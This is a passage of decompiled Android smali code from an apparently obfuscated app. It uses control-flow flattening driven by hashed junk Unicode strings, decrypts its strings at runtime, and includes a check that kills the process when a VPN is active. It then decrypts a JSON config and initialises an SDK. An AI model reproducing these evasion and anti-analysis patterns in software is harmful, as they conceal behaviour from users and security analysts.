    const-string v1, "\u06e8\u06e6\u06d6\u06e4\u06d7\u06e8\u06dc\u06d7\u06e8\u06d9\u06d6\u06d8\u06d8\u06e7\u06e7\u06e8\u06da\u06e8\u06e4\u06e4\u06e1\u06d8\u06df\u06e4\u06e0\u06df\u06e8\u06e0\u06eb\u06d6\u06da\u06e8\u06e1\u06e6\u06d8\u06e7\u06dc\u06dc\u06d8\u06eb\u06d8\u06da\u06e8\u06e4\u06df\u06e7\u06e0\u06e5\u06d8\u06eb\u06da\u06e5\u06d9\u06d8\u06e0\u06e5\u06eb\u06df"

    :goto_6
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_4

    goto :goto_6

    :sswitch_c
    const-string v1, "\u06e6\u06db\u06eb\u06e7\u06dc\u06df\u06ec\u06e4\u06e6\u06d8\u06da\u06e6\u06d8\u06d8\u06dc\u06e6\u06ec\u06e6\u06ec\u06d6\u06d8\u06e6\u06eb\u06df\u06dc\u06e0\u06e6\u06d8\u06e0\u06ec\u06eb\u06e8\u06e2\u06e8\u06e1\u06df\u06e1\u06d8\u06db\u06e4\u06e6\u06d7\u06dc\u06e6\u06dc\u06d7\u06dc\u06db\u06e4\u06e8\u06df\u06e2\u06e6"

    goto :goto_6

    :cond_1
    const-string v1, "\u06db\u06d7\u06eb\u06d9\u06e2\u06e1\u06d8\u06e4\u06e8\u06d9\u06df\u06e5\u06dc\u06d9\u06df\u06e8\u06d8\u06d8\u06d6\u06dc\u06d8\u06e1\u06e7\u06e7\u06e7\u06e7\u06dc\u06d8\u06d8\u06d9\u06e8\u06eb\u06eb\u06d6\u06d7\u06e2\u06e0\u06e5\u06d8\u06d9\u06e6\u06d8\u06d8\u06e0\u06d7\u06eb\u06e7\u06d7\u06ec\u06da\u06e8\u06dc"

    goto :goto_6

    :sswitch_d
    const-string v1, "Xz0GNHPTWEFHVXM5\n"

    const-string v7, "BB5QZD2QEAQ=\n"

    invoke-static {v1, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v7, Lcom/zyyad/gamf/kXEoVYTwnQIy;->VPNCHECK:Ljava/lang/String;

    invoke-virtual {v1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "\u06e8\u06e1\u06d8\u06d8\u06e6\u06e8\u06d8\u06e7\u06e5\u06dc\u06e1\u06dc\u06d9\u06e0\u06e5\u06e7\u06d8\u06dc\u06e8\u06dc\u06dc\u06db\u06d8\u06d8\u06e7\u06d8\u06ec\u06ec\u06df\u06e7\u06e5\u06d6\u06d7\u06d8\u06e2\u06e5\u06d8\u06e0\u06d8\u06db"

    goto :goto_6

    :sswitch_e
    const-string v1, "\u06e8\u06d8\u06df\u06ec\u06e8\u06d8\u06e1\u06d9\u06df\u06dc\u06dc\u06d6\u06db\u06da\u06da\u06d7\u06d6\u06dc\u06e0\u06e5\u06e1\u06d8\u06d6\u06e1\u06d6\u06da\u06e4\u06d8\u06d8\u06e2\u06e5\u06df\u06d9\u06e6\u06da\u06e7\u06d9\u06d6\u06d7\u06ec\u06d9\u06db\u06d7\u06e6\u06d8\u06df\u06da\u06e0\u06ec\u06e7\u06d9\u06db\u06db\u06e5\u06e5\u06eb\u06d6"

    goto :goto_3

    :sswitch_f
    const-string v1, "\u06d8\u06e6\u06e8\u06d8\u06ec\u06e2\u06d8\u06d8\u06d9\u06d6\u06ec\u06d7\u06e4\u06dc\u06da\u06e7\u06e7\u06e7\u06dc\u06e8\u06d8\u06db\u06e6\u06e1\u06e0\u06e4\u06e1\u06d8\u06eb\u06df\u06e8\u06d8\u06e2\u06d9\u06d6\u06ec\u06e1\u06d8\u06ec\u06d9\u06db"

    goto :goto_3

    :sswitch_10
    const v5, 0x35f953c1

    const-string v1, "\u06eb\u06e5\u06d6\u06d8\u06d9\u06e8\u06e1\u06da\u06e1\u06d8\u06d7\u06df\u06df\u06dc\u06ec\u06d7\u06d8\u06e8\u06e8\u06d8\u06e2\u06d9\u06da\u06e0\u06eb\u06ec\u06dc\u06e0\u06e6\u06d8\u06d7\u06da\u06e5\u06db\u06ec\u06d8\u06e0\u06d8\u06d8\u06ec\u06e0\u06db\u06eb\u06e0\u06d9\u06e6\u06e2\u06d9\u06e1\u06e1\u06eb\u06e0\u06dc\u06d6\u06d8\u06e4\u06e1\u06e6"

    :goto_7
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_5

    goto :goto_7

    :sswitch_11
    const v6, -0x1ed22b2f

    const-string v1, "\u06e8\u06db\u06e2\u06e8\u06db\u06e1\u06e1\u06dc\u06d8\u06d6\u06e1\u06d7\u06e8\u06e2\u06da\u06e4\u06e2\u06e6\u06d7\u06d9\u06d8\u06db\u06dc\u06d8\u06eb\u06d9\u06e4\u06d7\u06e8\u06e5\u06d8\u06db\u06d8\u06e5\u06d8\u06df\u06ec\u06e6\u06d8\u06eb\u06d9\u06da\u06e1\u06d8\u06d6\u06e1\u06da\u06d6\u06e5\u06db\u06e6\u06d8"

    :goto_8
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_6

    goto :goto_8

    :sswitch_12
    const-string v1, "\u06d6\u06d6\u06e0\u06e4\u06dc\u06d6\u06d8\u06e7\u06d9\u06ec\u06e5\u06e5\u06e4\u06d7\u06d6\u06e8\u06d8\u06d8\u06e6\u06e1\u06d8\u06d7\u06e5\u06d8\u06e7\u06d8\u06e0\u06da\u06df\u06dc\u06d8\u06dc\u06db\u06e0\u06d8\u06db\u06db\u06db\u06d7\u06df\u06e5\u06ec\u06db\u06d8\u06e7\u06e1"

    goto :goto_7

    :cond_2
    const-string v1, "\u06e5\u06e8\u06df\u06df\u06d8\u06ec\u06e7\u06e8\u06d7\u06d8\u06e1\u06e7\u06d8\u06e2\u06e7\u06d8\u06d6\u06e8\u06df\u06d7\u06e6\u06d9\u06d7\u06e0\u06dc\u06d8\u06d8\u06dc\u06e0\u06e5\u06d7\u06e2\u06e2\u06e2\u06da\u06e2\u06e8\u06d7\u06e0\u06df\u06d8\u06eb\u06d6\u06e2\u06dc\u06e8\u06d6\u06e2\u06e8\u06d8"

    goto :goto_8

    :sswitch_13
    invoke-static {v4}, Lapi/repository/Utils;->isVpnActive(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v1, "\u06e5\u06db\u06e8\u06d8\u06e4\u06d8\u06e6\u06d8\u06eb\u06d9\u06dc\u06d8\u06e1\u06e6\u06dc\u06d8\u06db\u06d8\u06d6\u06e0\u06e1\u06d8\u06eb\u06ec\u06e8\u06e5\u06d8\u06d8\u06ec\u06db\u06e6\u06d8\u06e5\u06e1\u06da\u06d8\u06e2\u06e1\u06e1\u06d9\u06d8\u06e6\u06e6\u06dc\u06d8\u06e5\u06ec\u06e8"

    goto :goto_8

    :sswitch_14
    const-string v1, "\u06dc\u06da\u06e1\u06d8\u06df\u06ec\u06e6\u06d7\u06df\u06e1\u06d8\u06da\u06da\u06d8\u06e2\u06e5\u06e7\u06d8\u06e6\u06e7\u06e1\u06d8\u06da\u06e4\u06e6\u06dc\u06ec\u06d9\u06d8\u06e1\u06e8\u06e4\u06d8\u06e0\u06e5\u06dc\u06e4\u06dc\u06e7\u06eb"

    goto :goto_8

    :sswitch_15
    const-string v1, "\u06eb\u06df\u06d8\u06d8\u06dc\u06e2\u06df\u06d8\u06db\u06e8\u06d8\u06d6\u06d7\u06ec\u06da\u06e1\u06e8\u06d8\u06e4\u06d9\u06d8\u06e2\u06e8\u06d8\u06dc\u06e0\u06e2\u06e4\u06e8\u06dc\u06d8\u06d7\u06dc\u06e2\u06dc\u06e0\u06e6\u06d8\u06e6\u06e1\u06e7"

    goto :goto_7

    :sswitch_16
    const-string v1, "\u06e8\u06d8\u06d6\u06e5\u06dc\u06e1\u06d8\u06df\u06e7\u06d8\u06d8\u06d9\u06e2\u06e0\u06d8\u06d9\u06d8\u06e6\u06e5\u06e8\u06d8\u06db\u06e4\u06e6\u06e4\u06d9\u06e4\u06d7\u06e6\u06dc\u06e8\u06df\u06e1\u06d8\u06e7\u06e6\u06e8\u06d8\u06e4"

    goto :goto_7

    :sswitch_17
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v0

    invoke-static {v0}, Landroid/os/Process;->killProcess(I)V

    move v0, v3

    goto/16 :goto_2

    :catchall_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    goto/16 :goto_4

    :sswitch_18
    const-string v1, "\u06dc\u06d6\u06e1\u06d8\u06db\u06e4\u06d6\u06d8\u06e6\u06e2\u06e0\u06e0\u06d6\u06e8\u06d8\u06e0\u06df\u06e4\u06dc\u06e0\u06df\u06d9\u06e0\u06d9\u06e0\u06e0\u06e4\u06e2\u06d7\u06e4\u06da\u06d6\u06e2\u06d9\u06d9\u06e5\u06df\u06e6\u06d8\u06e1\u06e8\u06d6\u06d8\u06d6\u06ec\u06d6\u06d8\u06d7\u06eb\u06e5\u06e5\u06eb\u06d8"

    goto/16 :goto_5

    :sswitch_19
    const v5, 0x6c8306e9

    const-string v1, "\u06db\u06e5\u06e5\u06d8\u06ec\u06d9\u06eb\u06e7\u06e8\u06d6\u06d8\u06e8\u06da\u06d8\u06d7\u06d8\u06e8\u06d8\u06e2\u06d6\u06d6\u06d8\u06dc\u06e0\u06e8\u06e0\u06d8\u06e7\u06d8\u06e6\u06e1\u06eb\u06db\u06df\u06df\u06e5\u06df\u06e2\u06e7\u06e6"

    :goto_9
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_7

    goto :goto_9

    :sswitch_1a
    if-eqz v2, :cond_3

    const-string v1, "\u06d9\u06da\u06e5\u06ec\u06e5\u06dc\u06d8\u06ec\u06e5\u06ec\u06e2\u06dc\u06e6\u06e8\u06d9\u06e6\u06d8\u06e5\u06e5\u06eb\u06e6\u06e1\u06e8\u06df\u06e4\u06da\u06db\u06e5\u06d8\u06da\u06df\u06da\u06e6\u06e8\u06e5\u06d8\u06db\u06e1\u06d8\u06e6\u06e0\u06dc\u06d8\u06e5\u06e5\u06dc\u06d8"

    goto :goto_9

    :cond_3
    const-string v1, "\u06e7\u06e0\u06e1\u06d8\u06e6\u06d8\u06d8\u06e5\u06da\u06e2\u06d8\u06e2\u06d6\u06d7\u06e8\u06d6\u06d8\u06dc\u06e4\u06d6\u06d8\u06dc\u06d7\u06e5\u06e0\u06d9\u06d6\u06d8\u06e7\u06dc\u06d8\u06e2\u06d6\u06db\u06e8\u06d8\u06eb\u06df\u06e6\u06d8\u06e0\u06d8\u06eb\u06e0\u06e6\u06d9\u06e1\u06d6\u06d6\u06d8\u06e4\u06d6\u06e8\u06d8"

    goto :goto_9

    :sswitch_1b
    const-string v1, "\u06e4\u06db\u06dc\u06e7\u06e5\u06e4\u06d9\u06eb\u06db\u06df\u06db\u06e5\u06e1\u06e7\u06e5\u06d8\u06dc\u06e7\u06df\u06e4\u06db\u06d6\u06d8\u06d8\u06e1\u06e6\u06d9\u06e8\u06e1\u06e6\u06ec\u06e1\u06d8\u06da\u06db\u06e6\u06e6\u06da\u06d6\u06d8"

    goto :goto_9

    :sswitch_1c
    const-string v1, "\u06da\u06da\u06e1\u06e7\u06df\u06e5\u06d8\u06d7\u06d7\u06e7\u06e7\u06e0\u06da\u06db\u06d9\u06d8\u06d8\u06d6\u06e4\u06d6\u06e1\u06e1\u06e8\u06d8\u06e0\u06e6\u06d7\u06db\u06e7\u06e8\u06e1\u06e6\u06e1\u06d8\u06e5\u06e1\u06dc\u06dc\u06db\u06e4"

    goto/16 :goto_5

    :sswitch_1d
    const v4, -0x31b91890

    const-string v1, "\u06dc\u06d7\u06e1\u06d8\u06d7\u06e6\u06d6\u06d8\u06e1\u06e8\u06d7\u06e6\u06eb\u06e0\u06e5\u06e7\u06d8\u06e6\u06df\u06eb\u06eb\u06da\u06d7\u06d6\u06d9\u06da\u06df\u06dc\u06ec\u06e4\u06e1\u06e8\u06db\u06dc\u06d8\u06d9\u06e5\u06e1\u06d8"

    :goto_a
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_8

    goto :goto_a

    :sswitch_1e
    const v4, 0x5e6943f1

    const-string v1, "\u06db\u06dc\u06d8\u06d8\u06e4\u06eb\u06d6\u06d8\u06da\u06e0\u06dc\u06d8\u06eb\u06da\u06dc\u06db\u06e6\u06da\u06e0\u06eb\u06e7\u06e8\u06df\u06ec\u06e2\u06e2\u06df\u06da\u06d6\u06e0\u06e7\u06e4\u06d8\u06d8"

    :goto_b
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_9

    goto :goto_b

    :sswitch_1f
    const-string v1, "\u06db\u06e1\u06e7\u06d7\u06e6\u06df\u06ec\u06d6\u06d8\u06e6\u06e8\u06e6\u06d8\u06eb\u06ec\u06dc\u06d8\u06e1\u06e6\u06d8\u06d8\u06e4\u06e8\u06e6\u06d8\u06e5\u06d8\u06e7\u06d8\u06e0\u06e6\u06db\u06e1\u06dc\u06e7\u06d8\u06d9\u06e4\u06e6\u06d8\u06eb\u06e1\u06e8\u06d8\u06e8\u06e7\u06da\u06e7\u06da\u06e0\u06db\u06e0\u06d6\u06d8\u06dc\u06eb\u06dc\u06d8"

    goto :goto_b

    :sswitch_20
    const-string v1, "\u06d8\u06e4\u06d8\u06d8\u06ec\u06da\u06da\u06e1\u06dc\u06dc\u06db\u06da\u06e0\u06e4\u06e7\u06d9\u06e7\u06df\u06e6\u06e5\u06dc\u06d8\u06e6\u06e4\u06e5\u06da\u06e4\u06d8\u06d8\u06dc\u06d9\u06e6\u06e8\u06e5\u06d6\u06d8\u06df\u06d7\u06d8\u06d8\u06eb\u06d6\u06e6\u06d8\u06e8\u06dc\u06e1"

    goto :goto_a

    :sswitch_21
    const v5, 0x1b3f6b4c

    const-string v1, "\u06d9\u06eb\u06db\u06e8\u06e5\u06e0\u06df\u06e4\u06e1\u06e0\u06ec\u06dc\u06e0\u06e7\u06db\u06e8\u06df\u06da\u06e5\u06e8\u06e6\u06d8\u06d7\u06d7\u06dc\u06e5\u06df\u06df\u06e7\u06d9\u06e0\u06df\u06d9\u06e1\u06d8\u06e2\u06eb\u06ec\u06db\u06e1\u06d7\u06df\u06d8\u06ec\u06dc\u06d8\u06da\u06e8\u06e6\u06eb\u06eb\u06e7\u06da\u06d8\u06df"

    :goto_c
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_a

    goto :goto_c

    :sswitch_22
    const-string v1, "\u06e0\u06d9\u06e5\u06d8\u06e0\u06d9\u06d7\u06df\u06db\u06ec\u06d8\u06e0\u06e6\u06d8\u06df\u06e0\u06e2\u06e4\u06ec\u06e1\u06d8\u06ec\u06e4\u06d8\u06e7\u06e5\u06d8\u06eb\u06e7\u06d8\u06d8\u06dc\u06d7\u06ec\u06e0\u06e2\u06d9\u06e2\u06e4\u06e7\u06ec\u06d8\u06e0\u06e5\u06d9\u06df\u06d6\u06db\u06e6\u06d9\u06ec\u06e8\u06d8\u06da\u06e0\u06d9\u06e7\u06e2\u06e1\u06d8"

    goto :goto_a

    :cond_4
    const-string v1, "\u06df\u06e7\u06e5\u06d8\u06e2\u06e2\u06d9\u06e0\u06e6\u06e0\u06da\u06d6\u06e4\u06df\u06db\u06e5\u06e4\u06e7\u06df\u06d6\u06e8\u06df\u06e2\u06e8\u06e6\u06d7\u06e0\u06e5\u06d8\u06e4\u06d8\u06e7\u06d9\u06e4\u06df\u06d8\u06d8\u06e8\u06dc\u06dc\u06ec\u06ec\u06e6\u06ec\u06df\u06d8\u06db\u06e4\u06e8\u06d8\u06d9\u06e7\u06e7\u06df\u06e0\u06e1\u06d8"

    goto :goto_c

    :sswitch_23
    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, "\u06da\u06e0\u06e1\u06d8\u06e0\u06d9\u06dc\u06db\u06e0\u06e5\u06dc\u06df\u06d8\u06d8\u06d7\u06e0\u06e6\u06da\u06d9\u06dc\u06d8\u06d6\u06e8\u06d9\u06e0\u06df\u06df\u06e6\u06da\u06d7\u06e6\u06d6\u06e5\u06d8"

    goto :goto_c

    :sswitch_24
    const-string v1, "\u06d8\u06e0\u06e1\u06d8\u06d9\u06e6\u06e5\u06d8\u06da\u06e1\u06e8\u06e4\u06d8\u06e6\u06da\u06e6\u06d7\u06d7\u06da\u06e4\u06e8\u06e7\u06d6\u06d8\u06ec\u06e4\u06e6\u06d8\u06d8\u06d9\u06da\u06ec\u06e2\u06d6\u06d8"

    goto :goto_c

    :sswitch_25
    const-string v1, "\u06dc\u06df\u06dc\u06d8\u06e1\u06e8\u06db\u06df\u06e0\u06da\u06e4\u06da\u06d6\u06d8\u06d6\u06e2\u06e6\u06d8\u06e2\u06d6\u06e1\u06e2\u06e0\u06d6\u06d8\u06e4\u06e7\u06da\u06e1\u06eb\u06d6\u06d8\u06db\u06d7\u06d8\u06d8\u06d8\u06e4\u06e2\u06e2\u06d9\u06d8\u06d8\u06e2\u06d8\u06e2\u06e2\u06df\u06e8\u06e0\u06e7\u06ec\u06e6\u06da\u06eb"

    goto :goto_a

    :sswitch_26
    const-string v1, "\u06e5\u06df\u06eb\u06e6\u06e6\u06e7\u06e0\u06d8\u06d9\u06df\u06d7\u06db\u06d9\u06dc\u06db\u06e0\u06e6\u06e7\u06d8\u06dc\u06d8\u06d9\u06eb\u06e1\u06e1\u06e4\u06e0\u06d8\u06d8\u06d9\u06e4\u06d8\u06d8\u06e5\u06e2\u06d6\u06d7\u06e6\u06e6"

    goto :goto_b

    :sswitch_27
    const v5, 0x647aafbe

    const-string v1, "\u06d9\u06e2\u06eb\u06d7\u06d9\u06d6\u06d8\u06ec\u06db\u06e0\u06e0\u06da\u06e7\u06dc\u06e1\u06d9\u06ec\u06d9\u06ec\u06eb\u06eb\u06e1\u06d8\u06e8\u06ec\u06ec\u06d9\u06ec\u06da\u06e6\u06dc\u06d8"

    :goto_d
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_b

    goto :goto_d

    :sswitch_28
    const-string v1, "6Odeiw==\n"

    const-string v6, "hpIy5z4reys=\n"

    invoke-static {v1, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_5

    const-string v1, "\u06e8\u06db\u06ec\u06e7\u06e1\u06e6\u06d9\u06da\u06e5\u06d8\u06e1\u06e2\u06da\u06df\u06d6\u06e0\u06d6\u06eb\u06db\u06e6\u06d8\u06e6\u06d8\u06da\u06dc\u06db\u06e0\u06e6\u06e1\u06e0\u06e8\u06e4\u06df\u06d6\u06d6\u06db\u06e6\u06e7\u06d8\u06e8\u06e2\u06e8\u06e6\u06e6\u06d6\u06d8"

    goto :goto_d

    :cond_5
    const-string v1, "\u06e7\u06e7\u06d8\u06d8\u06df\u06d8\u06e2\u06df\u06ec\u06dc\u06eb\u06e6\u06d6\u06d6\u06db\u06df\u06d7\u06d8\u06e4\u06d6\u06df\u06e4\u06d6\u06e0\u06d6\u06e2\u06ec\u06d8\u06d8\u06e2\u06d8\u06e7\u06d8\u06e1\u06e4\u06d6\u06d8\u06d6\u06eb\u06da\u06e7\u06d7\u06da\u06ec\u06da\u06dc"

    goto :goto_d

    :sswitch_29
    const-string v1, "\u06e1\u06df\u06e6\u06d8\u06e2\u06e4\u06e6\u06e4\u06d7\u06d6\u06d8\u06d8\u06d9\u06da\u06df\u06d6\u06d6\u06eb\u06e1\u06df\u06d7\u06dc\u06db\u06d8\u06e4\u06d7\u06db\u06dc\u06d8\u06d9\u06e1\u06e1"

    goto :goto_d

    :sswitch_2a
    const-string v1, "\u06e6\u06d9\u06e2\u06e6\u06e1\u06d8\u06eb\u06e2\u06dc\u06d9\u06dc\u06df\u06da\u06d7\u06d7\u06eb\u06e8\u06d8\u06da\u06df\u06eb\u06e4\u06e7\u06dc\u06d8\u06e4\u06ec\u06e8\u06d8\u06e8\u06e6\u06e7\u06d8\u06d8\u06da\u06e8\u06d8\u06e5\u06d7\u06e1\u06ec\u06e2\u06d8\u06d8\u06e0\u06d8\u06e6\u06d8"

    goto :goto_b

    :sswitch_2b
    :try_start_1
    const-string v1, "r5Htk/sj87Wnk7/FrXGh6w==\n"

    const-string v4, "nqPep84VxI0=\n"

    invoke-static {v1, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, LCu7y/sdk/e5;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const v4, 0x20f35de8

    const-string v1, "\u06e4\u06e8\u06e6\u06d8\u06eb\u06e6\u06e8\u06d8\u06e7\u06e4\u06e8\u06d8\u06df\u06ec\u06e6\u06db\u06d8\u06e8\u06d8\u06e4\u06e1\u06dc\u06ec\u06e5\u06e5\u06d8\u06e2\u06df\u06e2\u06dc\u06e8\u06e2\u06d6\u06e7\u06e6\u06d8\u06e6\u06eb\u06e2\u06e1\u06d6\u06d8"

    :goto_e
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_c

    goto :goto_e

    :sswitch_2c
    const v5, -0x1688b44f

    const-string v1, "\u06e7\u06da\u06e6\u06d8\u06df\u06e4\u06e0\u06d9\u06e0\u06d8\u06d8\u06ec\u06e4\u06e8\u06e6\u06e4\u06dc\u06e6\u06d6\u06d8\u06e0\u06dc\u06e7\u06e7\u06e8\u06d8\u06d8\u06e1\u06db\u06e8\u06db\u06dc\u06e5\u06d8\u06e8\u06df\u06d6\u06da\u06ec\u06e8"

    :goto_f
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_d

    goto :goto_f

    :sswitch_2d
    const-string v1, "\u06db\u06db\u06e4\u06df\u06df\u06ec\u06e5\u06e6\u06d6\u06d8\u06e2\u06d7\u06e2\u06e8\u06e2\u06e5\u06e0\u06eb\u06d8\u06d8\u06dc\u06e7\u06d9\u06da\u06eb\u06d7\u06e6\u06e0\u06e8\u06d8\u06ec\u06da\u06d8\u06d8\u06e8\u06e7\u06eb\u06da\u06eb\u06d8\u06d8\u06d8\u06eb\u06d8\u06d9\u06e0\u06e5\u06e0\u06e4\u06d8\u06e7\u06e1\u06d8"

    goto :goto_f

    :sswitch_2e
    const-string v1, "\u06eb\u06e7\u06e8\u06e0\u06ec\u06e6\u06d8\u06e8\u06e7\u06e6\u06df\u06e0\u06e8\u06d8\u06d6\u06e7\u06d8\u06d7\u06dc\u06da\u06e0\u06e4\u06e6\u06d8\u06dc\u06d6\u06d6\u06d8\u06db\u06d9\u06d6\u06d7\u06ec\u06d6\u06df\u06e8\u06d9\u06e6\u06e6\u06df\u06e4\u06e2\u06ec\u06d9\u06e7\u06d8\u06d8"

    goto :goto_e

    :cond_6
    const-string v1, "\u06db\u06e0\u06e6\u06d8\u06da\u06d9\u06d7\u06d8\u06e4\u06d8\u06d8\u06e4\u06e6\u06d6\u06d8\u06e4\u06e8\u06d8\u06e7\u06eb\u06d6\u06d8\u06dc\u06e5\u06d6\u06d7\u06df\u06e5\u06df\u06e8\u06e0\u06d9\u06da\u06db\u06db\u06e0\u06eb\u06e0\u06da\u06d8"

    goto :goto_f

    :sswitch_2f
    const-string v1, "w5WIhrO+/5fJkA==\n"

    const-string v6, "pvvp5N/bt/g=\n"

    invoke-static {v1, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v6, 0x0

    invoke-virtual {v2, v1, v6}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_6

    const-string v1, "\u06d8\u06d6\u06d9\u06e8\u06d9\u06e4\u06d8\u06df\u06d8\u06d6\u06db\u06e1\u06db\u06d6\u06e6\u06d8\u06e7\u06d8\u06e7\u06e1\u06e5\u06d6\u06d8\u06db\u06eb\u06e8\u06db\u06d9\u06df\u06e6\u06d7\u06e6\u06d8\u06e1\u06e4\u06eb\u06d8\u06e1\u06e1\u06d8"

    goto :goto_f

    :sswitch_30
    const-string v1, "\u06e2\u06e0\u06e0\u06e6\u06e6\u06dc\u06e5\u06eb\u06e5\u06d8\u06dc\u06dc\u06dc\u06db\u06d8\u06d8\u06e0\u06e2\u06db\u06da\u06da\u06e8\u06eb\u06ec\u06ec\u06d7\u06df\u06e7\u06d8\u06d8\u06e6\u06e7\u06e4\u06eb\u06e0\u06d7\u06e8\u06ec\u06db\u06e4\u06e0\u06e1\u06d8\u06e4\u06e5\u06e2\u06ec\u06e8\u06d6\u06df\u06e0\u06e1\u06db\u06db\u06e2"

    goto :goto_e

    :sswitch_31
    const-string v1, "\u06d8\u06e0\u06d8\u06d8\u06e5\u06d7\u06e1\u06d8\u06df\u06e4\u06df\u06da\u06d6\u06d8\u06e0\u06e7\u06e1\u06d8\u06e5\u06dc\u06da\u06da\u06df\u06d8\u06d9\u06e5\u06e6\u06ec\u06e6\u06d8\u06e0\u06db\u06d6\u06e8\u06eb\u06e6\u06d8\u06e0\u06e8\u06e2\u06df\u06df\u06e0\u06d6\u06eb\u06d6"

    goto :goto_e

    :sswitch_32
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "5yBeW3OYNCidRWkrKaNTcZ4PIAlKW7r1Ys+j+6NwuA==\n"

    const-string v4, "DqDEs8wf05Q=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-static {v0}, LCu7y/sdk/y0;->init(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :sswitch_33
    :try_start_2
    new-instance v1, LCu7y/sdk/m;

    const/4 v2, 0x1

    invoke-direct {v1, v2}, LCu7y/sdk/m;-><init>(I)V

    invoke-static {v1}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    const v2, -0x7ee6b3b9

    const-string v1, "\u06d8\u06d6\u06e5\u06dc\u06dc\u06db\u06db\u06eb\u06e8\u06d8\u06e8\u06dc\u06da\u06ec\u06e2\u06ec\u06e0\u06e4\u06eb\u06e2\u06e7\u06d9\u06e0\u06db\u06e8\u06d8\u06d6\u06e6\u06d6\u06d8\u06d8\u06dc\u06e6\u06d8\u06e4\u06e2\u06df\u06e8\u06eb\u06e0\u06e4\u06df\u06db\u06e2\u06e8\u06d8\u06d8\u06ec\u06e6\u06d8\u06ec\u06e1\u06e6\u06d8"

    :goto_10
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_e

    goto :goto_10

    :sswitch_34
    const v4, -0x35284532    # -7069031.0f

    const-string v1, "\u06d9\u06d9\u06e1\u06d8\u06d8\u06e6\u06e7\u06e4\u06e8\u06e0\u06e0\u06e4\u06d7\u06e7\u06e5\u06e6\u06d8\u06dc\u06d6\u06e7\u06e8\u06d8\u06d9\u06ec\u06e7\u06db\u06e4\u06df\u06e1\u06d8\u06e0\u06d9\u06dc\u06e7\u06eb\u06e4\u06dc\u06e6\u06dc\u06e0\u06d6\u06df\u06e7\u06db\u06e4\u06e6\u06e4\u06e7\u06e7\u06ec"

    :goto_11
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_f

    goto :goto_11

    :sswitch_35
    sget-object v1, Lcom/zyyad/gamf/kXEoVYTwnQIy;->NETWORK:Ljava/lang/String;

    const-string v5, "Ry60CsU0gRtXLqc=\n"

    const-string v6, "HA36T5Fjzkk=\n"

    invoke-static {v5, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v5}, Lj$/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

